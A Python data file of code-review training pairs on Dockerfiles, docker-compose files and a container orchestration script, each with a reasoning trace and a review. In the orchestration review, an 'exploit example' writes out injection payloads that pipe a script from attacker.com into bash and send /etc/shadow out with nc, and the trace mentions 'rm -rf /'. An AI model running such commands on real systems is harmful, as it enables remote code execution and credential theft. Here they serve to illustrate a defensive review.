r"""Thinking-trace pairs: Dockerfile and container code review and refactoring."""

PAIRS = [
    ("thinking/code-review", r'''Review this Dockerfile and identify issues:

```dockerfile
FROM ubuntu:latest

RUN apt-get update
RUN apt-get install -y python3 python3-pip curl wget git vim nano
RUN apt-get install -y build-essential libpq-dev libffi-dev
RUN pip3 install flask gunicorn psycopg2 redis celery sqlalchemy alembic
RUN pip3 install requests boto3 pyjwt cryptography

COPY . /app
WORKDIR /app

RUN pip3 install -r requirements.txt

ENV FLASK_APP=app.py
ENV FLASK_ENV=production
ENV DATABASE_URL=postgresql://user:password@db:5432/myapp
ENV SECRET_KEY=super-secret-key-123
ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
ENV REDIS_URL=redis://redis:6379/0

EXPOSE 5000

CMD python3 app.py
```''', r'''<think>
This Dockerfile has numerous serious issues. Let me categorize them:

Base image:
- Using ubuntu:latest instead of a slim/minimal image. Ubuntu base is ~70MB compressed, python:3.11-slim is ~40MB. Also, "latest" tag is mutable and non-reproducible.
- Using a general-purpose OS image instead of a language-specific image

Layer optimization:
- Multiple RUN commands that should be combined to reduce layers
- apt-get update and install in separate RUN commands - the update layer gets cached and packages can become stale
- Installing unnecessary tools (vim, nano, wget, git) in production image
- pip install run twice - once inline and once from requirements.txt, likely installing duplicate packages
- COPY . /app is done before pip install requirements.txt, meaning any code change invalidates the pip cache

Security:
- Hardcoded secrets in ENV: DATABASE_URL with password, SECRET_KEY, AWS credentials
- Running as root (no USER directive)
- No .dockerignore mentioned (COPY . copies everything including .git, .env, etc.)

Configuration:
- FLASK_ENV=production but using python3 app.py (Flask dev server) instead of gunicorn
- CMD not using exec form (should be ["python3", "app.py"] or better, gunicorn)
- No HEALTHCHECK defined
- No multi-stage build to reduce final image size

Missing:
- No pinned versions for apt packages
- No cleanup of apt cache (rm -rf /var/lib/apt/lists/*)
- No non-root user
- build-essential installed but not cleaned up (only needed for compilation)
</think>

## Code Review: Production Dockerfile

### CRITICAL - Hardcoded Secrets in Image
The Dockerfile bakes sensitive credentials directly into the image as ENV directives. Anyone with access to the image can extract DATABASE_URL (with password), SECRET_KEY, and AWS credentials. These secrets are visible in `docker history` and in any container created from this image.

**Fix:** Remove all secret ENV directives. Pass secrets at runtime via environment variables, Docker secrets, or a secrets manager:
```dockerfile
# Remove these lines entirely. Pass at runtime:
# docker run -e DATABASE_URL=... -e SECRET_KEY=... myapp
```

### CRITICAL - Running as Root
No USER directive means the application runs as root inside the container. If the application is compromised, the attacker has root access to the container and potentially the host (in misconfigured Docker setups).

**Fix:**
```dockerfile
RUN groupadd -r appuser && useradd -r -g appuser appuser
USER appuser
```

### HIGH - Using Dev Server in Production
`CMD python3 app.py` runs the Flask development server, which is single-threaded, not hardened, and explicitly warns against production use. Gunicorn is installed but not used.

**Fix:**
```dockerfile
CMD ["gunicorn", "--bind", "0.0.0.0:5000", "--workers", "4", "app:app"]
```

### HIGH - Non-Reproducible Base Image
`FROM ubuntu:latest` is a moving target. Builds on different days produce different images. Also, Ubuntu is unnecessarily large for a Python application.

**Fix:**
```dockerfile
FROM python:3.11-slim-bookworm
```

### HIGH - Poor Layer Caching Strategy
`COPY . /app` is done before `pip install -r requirements.txt`. Any code change invalidates the pip install cache, forcing a full reinstall of all dependencies on every build.

**Fix:**
```dockerfile
COPY requirements.txt /app/requirements.txt
WORKDIR /app
RUN pip install --no-cache-dir -r requirements.txt
COPY . /app
```

### MEDIUM - Multiple RUN Layers and No Cleanup
Six separate RUN commands create six layers. apt cache is never cleaned, and build-essential is left installed after compilation is done.

**Fix:** Combine into a single RUN with cleanup:
```dockerfile
RUN apt-get update && \
    apt-get install -y --no-install-recommends libpq-dev && \
    rm -rf /var/lib/apt/lists/*
```

### MEDIUM - Unnecessary Packages in Production
vim, nano, wget, git, and build-essential have no place in a production image. They increase attack surface and image size. Use a multi-stage build if compilation is needed.

### LOW - CMD Shell Form Instead of Exec Form
`CMD python3 app.py` uses shell form, which runs as a child of `/bin/sh`. Signals (SIGTERM) go to the shell, not the application, preventing graceful shutdown.

**Fix:** `CMD ["gunicorn", "--bind", "0.0.0.0:5000", "app:app"]`'''),

    ("thinking/code-review", r'''Review this docker-compose.yml and identify issues:

```yaml
version: "3"

services:
  web:
    build: .
    ports:
      - "80:5000"
    environment:
      - DATABASE_URL=postgresql://admin:admin123@db:5432/production
      - REDIS_URL=redis://redis:6379/0
      - SECRET_KEY=my-secret-key
      - AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
      - AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG
    volumes:
      - .:/app
    depends_on:
      - db
      - redis
    restart: always

  worker:
    build: .
    command: celery -A tasks worker --loglevel=info
    environment:
      - DATABASE_URL=postgresql://admin:admin123@db:5432/production
      - REDIS_URL=redis://redis:6379/0
    volumes:
      - .:/app
    depends_on:
      - db
      - redis
    restart: always

  db:
    image: postgres
    environment:
      - POSTGRES_DB=production
      - POSTGRES_USER=admin
      - POSTGRES_PASSWORD=admin123
    ports:
      - "5432:5432"
    volumes:
      - ./data:/var/lib/postgresql/data

  redis:
    image: redis
    ports:
      - "6379:6379"

  nginx:
    image: nginx
    ports:
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
      - ./certs:/etc/nginx/certs
```''', r'''<think>
Let me analyze this docker-compose file for security, reliability, and configuration issues.

Security issues:
- Hardcoded credentials everywhere (DATABASE_URL, POSTGRES_PASSWORD, AWS keys, SECRET_KEY)
- Database port 5432 exposed to host - no reason for external access in most setups
- Redis port 6379 exposed to host with no authentication
- Weak password "admin123" for production database
- Certificates mounted from local directory
- No network isolation between services

Reliability:
- depends_on only waits for container start, not service readiness. Web service will crash if DB is not ready.
- No health checks defined for any service
- No resource limits (memory, CPU)
- No logging configuration
- restart: always without health checks means a crashing container will restart endlessly

Image tags:
- postgres, redis, nginx all use :latest (implicit) - non-reproducible
- version: "3" instead of a specific version like "3.8"

Volume issues:
- .:/app bind mount in production overwrites the built image contents with host filesystem - this is a development pattern, not production
- ./data for postgres data stored in project directory, not a named volume - risk of accidental deletion
- No volume for redis persistence

Configuration issues:
- Credentials duplicated between web and worker services
- No network definitions - all services on default bridge network
- nginx configured for 443 but no port 80 redirect and web is on port 80
- No docker-compose.override.yml pattern for dev/prod separation

Missing:
- No backup strategy for database
- No monitoring/health check endpoints
- No rate limiting or connection pooling
</think>

## Code Review: Docker Compose Configuration

### CRITICAL - Plaintext Secrets in Compose File
Database credentials, AWS keys, and application secrets are hardcoded in plaintext. This file is almost certainly committed to version control, exposing all production credentials.

**Fix:** Use Docker secrets or an `.env` file (excluded from git):
```yaml
services:
  web:
    env_file:
      - .env
```
And add `.env` to `.gitignore`. For production, use Docker Swarm secrets or an external secret manager.

### CRITICAL - Database and Redis Exposed to Host Network
`ports: "5432:5432"` and `ports: "6379:6379"` expose the database and cache to the host (and potentially the internet). Redis has no authentication configured at all.

**Fix:** Remove port mappings for internal services. They are accessible to other containers via the Docker network without port exposure:
```yaml
db:
    image: postgres:16-alpine
    # No ports section - only accessible internally
    expose:
      - "5432"
```

### HIGH - Bind Mount Overwrites Built Image
`volumes: - .:/app` mounts the host directory into the container, overwriting whatever was built into the image. In production, this means the container runs whatever is on the host filesystem, not the tested, built artifact.

**Fix:** Remove bind mounts in production. Use them only in a development override file (`docker-compose.override.yml`).

### HIGH - depends_on Without Health Checks
`depends_on: [db, redis]` only waits for the container to start, not for PostgreSQL or Redis to be ready to accept connections. The web app will crash on startup if the database takes a few seconds to initialize.

**Fix:**
```yaml
depends_on:
    db:
        condition: service_healthy
db:
    healthcheck:
        test: ["CMD-SHELL", "pg_isready -U admin"]
        interval: 5s
        timeout: 5s
        retries: 5
```

### HIGH - Unpinned Image Versions
`postgres`, `redis`, and `nginx` all use implicit `:latest` tags. A `docker-compose pull` on different days can produce different, incompatible versions.

**Fix:** Pin specific versions: `postgres:16-alpine`, `redis:7-alpine`, `nginx:1.25-alpine`.

### MEDIUM - No Resource Limits
No memory or CPU limits on any service. A memory leak in the web app or worker can consume all host memory and crash other services.

**Fix:**
```yaml
deploy:
    resources:
        limits:
            memory: 512M
            cpus: "1.0"
```

### MEDIUM - Duplicated Configuration
DATABASE_URL and REDIS_URL are duplicated between web and worker. Use YAML anchors or an env_file to avoid drift.

### MEDIUM - No Network Isolation
All services share the default network. The nginx proxy can directly access the database. Define separate networks for frontend and backend tiers.

### LOW - Database Volume Uses Bind Mount
`./data:/var/lib/postgresql/data` stores database files in the project directory. Use a named volume for better lifecycle management and to avoid accidental deletion during cleanup.'''),

    ("thinking/code-review", r'''Review this multi-stage Dockerfile and identify issues:

```dockerfile
FROM node:18 AS frontend-build
WORKDIR /frontend
COPY frontend/package.json frontend/package-lock.json ./
RUN npm ci
COPY frontend/ ./
RUN npm run build

FROM python:3.11 AS backend-build
WORKDIR /backend
COPY requirements.txt ./
RUN pip install --user -r requirements.txt
COPY . ./

FROM python:3.11
WORKDIR /app

COPY --from=backend-build /root/.local /root/.local
COPY --from=backend-build /backend /app
COPY --from=frontend-build /frontend/build /app/static

ENV PATH=/root/.local/bin:$PATH
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1

RUN apt-get update && apt-get install -y \
    curl \
    && rm -rf /var/lib/apt/lists/*

EXPOSE 8000

HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8000/health || exit 1

USER nobody

CMD ["gunicorn", "--bind", "0.0.0.0:8000", "--workers", "4", "--timeout", "120", "app:create_app()"]
```''', r'''<think>
This is a multi-stage Dockerfile, which is already better than most. Let me review it carefully.

Positive aspects:
- Multi-stage build separating frontend build, backend build, and runtime
- npm ci for reproducible installs
- pip install --user for isolated Python packages
- PYTHONUNBUFFERED and PYTHONDONTWRITEBYTECODE set
- HEALTHCHECK defined
- USER nobody for non-root execution
- Exec form CMD
- apt cache cleaned up

Issues I see:

1. COPY . ./ in backend-build stage copies everything including the frontend directory, node_modules (if present), .git, etc. The frontend was already built in a separate stage, so this copies unnecessary files.

2. USER nobody is set AFTER the COPY --from commands that copy to /root/.local. The nobody user cannot read files owned by root in /root/.local because /root typically has 700 permissions. This will cause import errors at runtime.

3. The backend-build stage copies the entire project context (COPY . ./), which means any change to any file invalidates the pip cache layer. The requirements.txt copy and install should remain separate (which it does), but the full COPY still copies unnecessarily.

4. gunicorn command uses "app:create_app()" with parentheses - this is the factory pattern syntax. Let me check - in gunicorn, this should be "app:create_app()" which actually works since gunicorn supports callable factories. So this is fine.

5. No .dockerignore mentioned - COPY . ./ will include .git, __pycache__, .env files, etc.

6. HEALTHCHECK start-period of 5s may be too short if the app takes time to boot (database migrations, connection pool warmup).

7. The final stage uses python:3.11 (full image, ~900MB) instead of python:3.11-slim (~150MB). Since build tools were in the build stages, the runtime stage only needs the slim image.

8. No pinned OS version - python:3.11 could be bullseye or bookworm.

9. curl is installed just for healthcheck - adds attack surface. Could use python-based health check instead.

10. --workers 4 is hardcoded. Should be configurable via environment variable or calculated from CPU count.
</think>

## Code Review: Multi-Stage Dockerfile

### CRITICAL - USER nobody Cannot Access /root/.local
Python packages are installed to `/root/.local` in the build stage and copied to the same path in the runtime stage. However, `USER nobody` is set after this copy. The `nobody` user typically cannot traverse `/root/` (which has `drwx------` permissions), so all Python imports will fail at runtime with `ModuleNotFoundError`.

**Fix:** Install packages to a user-independent location and create a proper non-root user:
```dockerfile
RUN groupadd -r appuser && useradd -r -g appuser -d /home/appuser appuser
COPY --from=backend-build /root/.local /home/appuser/.local
RUN chown -R appuser:appuser /home/appuser/.local /app
ENV PATH=/home/appuser/.local/bin:$PATH
USER appuser
```

### HIGH - Full Base Image Instead of Slim
The final runtime stage uses `python:3.11` (full Debian image, ~900MB) when all compilation happened in the build stage. The runtime only needs the slim variant.

**Fix:**
```dockerfile
FROM python:3.11-slim-bookworm
```
This reduces the final image from ~900MB to ~150MB.

### HIGH - COPY . ./ Copies Unnecessary Files
The backend-build stage runs `COPY . ./` which includes the entire frontend directory (already built separately), any node_modules, .git directory, test files, documentation, and potentially .env files with secrets.

**Fix:** Use a `.dockerignore` file:
```
.git
frontend/node_modules
frontend/build
*.md
.env*
__pycache__
*.pyc
.pytest_cache
```

### MEDIUM - Installing curl Just for Health Check
curl is installed in the runtime image solely for the HEALTHCHECK command. This adds unnecessary packages and attack surface.

**Fix:** Use Python for the health check:
```dockerfile
HEALTHCHECK --interval=30s --timeout=10s --start-period=10s --retries=3 \
    CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:8000/health')" || exit 1
```

### MEDIUM - Hardcoded Worker Count
`--workers 4` is hardcoded. In environments with different CPU counts (2-core dev vs 8-core prod), this is suboptimal.

**Fix:**
```dockerfile
ENV GUNICORN_WORKERS=4
CMD ["sh", "-c", "gunicorn --bind 0.0.0.0:8000 --workers ${GUNICORN_WORKERS} --timeout 120 app:create_app()"]
```

### MEDIUM - Short HEALTHCHECK start-period
`--start-period=5s` may be insufficient if the application runs database migrations or initializes connection pools on startup. Failed health checks during start-period are not counted, but 5 seconds is tight.

**Fix:** Increase to 30-60 seconds: `--start-period=30s`

### LOW - Unpinned OS Version
`python:3.11` does not pin the underlying Debian version. Use `python:3.11-slim-bookworm` for full reproducibility.

### LOW - No Build-Time Cache Mounts
pip downloads packages from the internet on every build. Use BuildKit cache mounts to persist the pip cache across builds:
```dockerfile
RUN --mount=type=cache,target=/root/.cache/pip pip install --user -r requirements.txt
```'''),

    ("thinking/code-review", r'''Review this container orchestration script and identify issues:

```python
import subprocess
import os
import time
import json

class ContainerOrchestrator:
    def __init__(self, compose_file="docker-compose.yml"):
        self.compose_file = compose_file
        self.project_name = "myapp"

    def deploy(self, tag="latest"):
        print(f"Deploying version {tag}...")

        os.environ["IMAGE_TAG"] = tag

        subprocess.run(
            f"docker-compose -f {self.compose_file} -p {self.project_name} pull",
            shell=True
        )

        subprocess.run(
            f"docker-compose -f {self.compose_file} -p {self.project_name} up -d",
            shell=True
        )

        time.sleep(10)

        result = subprocess.run(
            f"docker-compose -f {self.compose_file} -p {self.project_name} ps",
            shell=True, capture_output=True, text=True
        )
        print(result.stdout)

    def rollback(self, previous_tag):
        print(f"Rolling back to {previous_tag}...")
        self.deploy(previous_tag)

    def scale_service(self, service, replicas):
        subprocess.run(
            f"docker-compose -f {self.compose_file} -p {self.project_name} "
            f"up -d --scale {service}={replicas}",
            shell=True
        )

    def run_migrations(self):
        subprocess.run(
            f"docker-compose -f {self.compose_file} -p {self.project_name} "
            f"exec web python manage.py migrate",
            shell=True
        )

    def backup_database(self, output_file):
        subprocess.run(
            f"docker-compose -f {self.compose_file} -p {self.project_name} "
            f"exec db pg_dump -U admin production > {output_file}",
            shell=True
        )

    def view_logs(self, service, lines=100):
        subprocess.run(
            f"docker-compose -f {self.compose_file} -p {self.project_name} "
            f"logs --tail={lines} {service}",
            shell=True
        )

    def health_check(self):
        for service in ["web", "worker", "db", "redis"]:
            result = subprocess.run(
                f"docker inspect --format='{{{{.State.Health.Status}}}}' "
                f"{self.project_name}_{service}_1",
                shell=True, capture_output=True, text=True
            )
            status = result.stdout.strip()
            print(f"{service}: {status}")

    def cleanup(self):
        subprocess.run("docker system prune -af", shell=True)
        subprocess.run("docker volume prune -f", shell=True)

    def get_stats(self):
        result = subprocess.run(
            "docker stats --no-stream --format '{{.Name}}: {{.CPUPerc}} {{.MemUsage}}'",
            shell=True, capture_output=True, text=True
        )
        return result.stdout
```''', r'''<think>
Let me analyze this container orchestration script for safety, correctness, and operational issues.

Command injection:
Every method uses shell=True with f-strings. The tag, service, replicas, output_file, and service parameters are directly interpolated into shell commands. If any of these come from user input (e.g., a web API or CLI), this is a command injection vulnerability.

For example: deploy(tag="; rm -rf /") would execute the destructive command.
backup_database(output_file="; cat /etc/shadow") would leak sensitive data.

Error handling:
- No return code checking anywhere. subprocess.run() returns a CompletedProcess but the return code is never checked.
- If pull fails, the script proceeds to up -d anyway, potentially running stale images.
- If migrations fail, there is no rollback or notification.
- If backup fails, the output_file may be empty or truncated.

Deployment strategy:
- deploy() does pull then up -d, which causes downtime. No rolling update, blue-green, or canary strategy.
- time.sleep(10) as a health check is fragile. Should poll the health endpoint.
- rollback() just calls deploy() with an old tag - no verification that the old tag exists or that rollback succeeded.
- No pre-deployment database backup.

cleanup() is extremely dangerous:
- docker system prune -af removes ALL unused images, containers, networks
- docker volume prune -f removes ALL unused volumes, including database data!
- No confirmation, no filtering, no safety check

health_check():
- Assumes container naming convention {project}_{service}_1 which is docker-compose v1 format. Docker Compose v2 uses hyphens: {project}-{service}-1
- No handling for containers without HEALTHCHECK defined (returns empty string)

Other issues:
- Using deprecated docker-compose (v1) instead of docker compose (v2)
- No logging beyond print statements
- No concurrent operation handling
- get_stats() returns raw string instead of structured data
- No timeout on any subprocess call - a hung command blocks forever
</think>

## Code Review: Container Orchestration Script

### CRITICAL - Command Injection in Every Method
All methods use `shell=True` with f-string interpolation. Parameters like `tag`, `service`, `output_file`, and `replicas` are injected directly into shell commands without any sanitization.

**Exploit example:**
```python
orchestrator.deploy(tag='latest; curl attacker.com/shell.sh | bash')
orchestrator.backup_database(output_file='/dev/null; cat /etc/shadow | nc attacker.com 4444')
```

**Fix:** Use list form without shell=True:
```python
subprocess.run(
    ["docker", "compose", "-f", self.compose_file, "-p", self.project_name, "pull"],
    check=True
)
```

### CRITICAL - cleanup() Destroys All Docker Data
`docker system prune -af` removes all unused images and containers across the entire host (not just this project). `docker volume prune -f` deletes all unused volumes, which likely includes database data volumes. A single accidental call wipes production data.

**Fix:** Scope cleanup to the project only:
```python
def cleanup(self):
    subprocess.run(
        ["docker", "compose", "-f", self.compose_file, "-p", self.project_name,
         "down", "--remove-orphans"],
        check=True
    )
```

### HIGH - No Return Code Checking
Every `subprocess.run()` call ignores the return code. If `pull` fails (network error, auth failure), the script proceeds to `up -d` with stale or missing images. If migrations fail, no one is notified.

**Fix:** Add `check=True` to all subprocess calls and wrap in try/except:
```python
try:
    subprocess.run([...], check=True)
except subprocess.CalledProcessError as e:
    logger.error(f"Command failed with code {e.returncode}")
    raise
```

### HIGH - Deployment Causes Downtime
`docker-compose up -d` recreates containers, causing a gap between the old container stopping and the new one starting. There is no rolling update, health gate, or traffic draining.

**Fix:** Implement a rolling deployment:
1. Scale up new containers alongside old ones
2. Wait for health checks to pass
3. Drain traffic from old containers
4. Remove old containers

### HIGH - Sleep-Based Health Verification
`time.sleep(10)` after deployment is unreliable. If the app takes 15 seconds to start, the check passes on a not-yet-ready service. If it starts in 2 seconds, 8 seconds are wasted.

**Fix:** Poll the health endpoint with a timeout:
```python
def wait_for_healthy(self, service, timeout=60):
    start = time.time()
    while time.time() - start < timeout:
        if self._check_health(service) == "healthy":
            return True
        time.sleep(2)
    raise TimeoutError(f"{service} did not become healthy")
```

### MEDIUM - No Subprocess Timeouts
No `timeout` parameter on any subprocess call. A hung `docker exec` or `docker pull` will block the script indefinitely.

### MEDIUM - Using Deprecated docker-compose v1
The script uses `docker-compose` (Python v1, deprecated). The modern replacement is `docker compose` (Go v2, built into Docker CLI). Container naming also changed from underscores to hyphens, which breaks `health_check()`.

### LOW - No Structured Logging
All output uses `print()`. In production, this should use the logging module with structured output for aggregation in log management systems.'''),

    ("thinking/code-review", r'''Review this Dockerfile health check and startup script:

```dockerfile
FROM python:3.11-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 8000
ENTRYPOINT ["/entrypoint.sh"]
```

```bash
#!/bin/bash
# entrypoint.sh

echo "Starting application..."

# Wait for database
while ! nc -z db 5432; do
    echo "Waiting for database..."
    sleep 1
done

echo "Database is ready!"

# Run migrations
python manage.py migrate

# Collect static files
python manage.py collectstatic --noinput

# Create superuser
echo "from django.contrib.auth import get_user_model; User = get_user_model(); User.objects.create_superuser('admin', 'admin@example.com', 'admin123')" | python manage.py shell

# Start server
if [ "$ENV" = "production" ]; then
    gunicorn myapp.wsgi:application --bind 0.0.0.0:8000 --workers 4
else
    python manage.py runserver 0.0.0.0:8000
fi
```''', r'''<think>
Let me analyze both the Dockerfile and the entrypoint script.

Dockerfile issues:
- No USER directive - runs as root
- No HEALTHCHECK directive
- Using python:3.11-slim without pinning the OS variant
- COPY . . before pip install is correct (requirements.txt copied first) - wait, COPY . . after pip install is correct here. Good.
- No multi-stage build, but for a Django app this might be acceptable

Entrypoint script issues:

1. Database wait loop:
- Uses `nc` (netcat) but it may not be installed in python:3.11-slim
- No timeout on the wait loop - will loop forever if db never comes up
- Only checks TCP connection, not that PostgreSQL is actually ready to accept queries

2. Migrations in entrypoint:
- Running migrations on every container start is dangerous in multi-replica deployments
- Two containers starting simultaneously will both try to run migrations, potentially causing conflicts
- If migration fails, the script continues to start the server anyway (no error checking)

3. Superuser creation:
- Creates superuser with hardcoded weak password "admin123" on EVERY container start
- Will throw an error on subsequent starts if user already exists (IntegrityError)
- Credentials visible in Dockerfile/script which are usually in version control

4. collectstatic on every start:
- Adds unnecessary startup time
- Should be done at build time, not runtime

5. No error handling:
- set -e is not used, so failures in migrate or collectstatic are silently ignored
- No signal handling (trap) for graceful shutdown

6. Shell form concerns:
- The if/else for gunicorn vs runserver means gunicorn is not PID 1, it is a child of bash
- Without exec, signals (SIGTERM) go to bash, not gunicorn
- Need `exec gunicorn ...` for proper signal forwarding

7. Missing shebang edge case:
- #!/bin/bash is fine but bash may not be in slim images (though python:3.11-slim does include it)
</think>

## Code Review: Dockerfile and Entrypoint Script

### CRITICAL - Superuser Created with Hardcoded Password on Every Start
The entrypoint creates a Django superuser with username `admin` and password `admin123` every time the container starts. This password is visible in the script (likely version-controlled), and the creation will throw an IntegrityError on subsequent starts since the user already exists.

**Fix:** Remove from entrypoint entirely. Use a separate init script or management command that checks for existence:
```python
# In a custom management command
from django.contrib.auth import get_user_model
User = get_user_model()
if not User.objects.filter(username='admin').exists():
    User.objects.create_superuser(
        os.environ['DJANGO_SUPERUSER_USERNAME'],
        os.environ['DJANGO_SUPERUSER_EMAIL'],
        os.environ['DJANGO_SUPERUSER_PASSWORD']
    )
```

### CRITICAL - Migrations Run on Every Container Start
Running `python manage.py migrate` in the entrypoint means every container replica attempts migrations simultaneously in multi-replica deployments. This causes race conditions, lock contention, and potentially corrupted migration state.

**Fix:** Run migrations as a separate one-shot container or init container:
```bash
docker compose run --rm web python manage.py migrate
```

### HIGH - No Error Handling (Missing set -e)
The script lacks `set -e`, so failures in `migrate` or `collectstatic` are silently ignored. The server starts even if migrations failed, leading to runtime errors from missing tables or columns.

**Fix:** Add at the top of the script:
```bash
set -euo pipefail
```

### HIGH - No Timeout on Database Wait Loop
The `while ! nc -z db 5432` loop has no upper bound. If the database is permanently down or misconfigured, the container loops forever, consuming resources and never reporting failure.

**Fix:**
```bash
MAX_RETRIES=30
RETRY_COUNT=0
while ! nc -z db 5432; do
    RETRY_COUNT=$((RETRY_COUNT + 1))
    if [ $RETRY_COUNT -ge $MAX_RETRIES ]; then
        echo "ERROR: Database not available after ${MAX_RETRIES} attempts"
        exit 1
    fi
    echo "Waiting for database... ($RETRY_COUNT/$MAX_RETRIES)"
    sleep 1
done
```

### HIGH - Missing exec Before Final Command
The gunicorn and runserver commands are not prefixed with `exec`. This means bash remains PID 1 and gunicorn runs as a child process. Docker sends SIGTERM to PID 1 (bash), which does not forward it to gunicorn, preventing graceful shutdown.

**Fix:**
```bash
exec gunicorn myapp.wsgi:application --bind 0.0.0.0:8000 --workers 4
```

### MEDIUM - collectstatic at Runtime
`collectstatic` runs on every container start, adding unnecessary startup latency. Static files do not change between restarts, so this should be a build-time step.

**Fix:** Move to Dockerfile:
```dockerfile
RUN python manage.py collectstatic --noinput
```

### MEDIUM - netcat May Not Be Installed
`nc` (netcat) is not included in `python:3.11-slim` by default. The wait loop will fail silently (since there is no set -e). Use a Python-based check instead:
```bash
python -c "import socket; s = socket.create_connection(('db', 5432), timeout=1); s.close()"
```

### LOW - No HEALTHCHECK in Dockerfile
The Dockerfile has no HEALTHCHECK instruction, so Docker has no way to determine if the application is actually serving requests.

### LOW - Running as Root
No USER directive in the Dockerfile means the application runs as root inside the container.'''),
]
